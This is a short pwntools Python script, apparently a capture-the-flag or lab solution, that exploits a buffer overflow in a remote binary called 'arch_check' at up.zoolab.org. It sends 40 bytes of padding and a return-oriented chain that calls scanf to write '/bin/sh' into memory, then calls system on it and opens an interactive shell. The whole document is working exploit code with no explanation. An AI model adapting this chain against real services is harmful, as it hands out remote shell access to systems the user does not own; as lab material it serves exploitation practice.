from pwn import *
r = remote('up.zoolab.org', 30001)
#r = process('./arch_check')
context.arch = 'amd64'

binsh_addr = 0x404f00
offset = 40
pop_rdi = 0x4012c3
pop_rsi_r15 = 0x4012c1
scanf_addr = 0x4010a0
system_addr = 0x401090
format_s = 0x403060
padding = 'a'*offset
ret = 0x40101a #For 16bytes alignment

payload = flat(
	padding,
	pop_rdi, format_s,
	pop_rsi_r15, binsh_addr, 0,
	scanf_addr,
	pop_rdi, binsh_addr,
	ret,#alignment
	system_addr,
)

r.recv()
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
